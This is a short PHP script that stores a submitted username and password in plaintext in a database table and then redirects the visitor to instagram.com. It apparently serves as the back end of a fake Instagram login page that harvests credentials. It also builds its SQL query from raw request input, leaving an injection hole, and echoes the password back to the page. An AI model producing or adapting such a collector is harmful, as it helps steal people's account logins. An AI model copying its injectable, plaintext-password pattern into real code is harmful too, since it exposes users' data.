<?php 
    include "conexion.php";

    $nombre=$_REQUEST['nombre'];

    $password=$_REQUEST['password'];
       echo"$nombre, $password";
	$sql="INSERT INTO registros (usermane, password) VALUES
	('$nombre', '$password')";
	
	if(!$error= $con-> query($sql)){
		 echo $con->error;
	}
	else{
        header ("location:https://www.instagram.com/");
        
    }
    ?>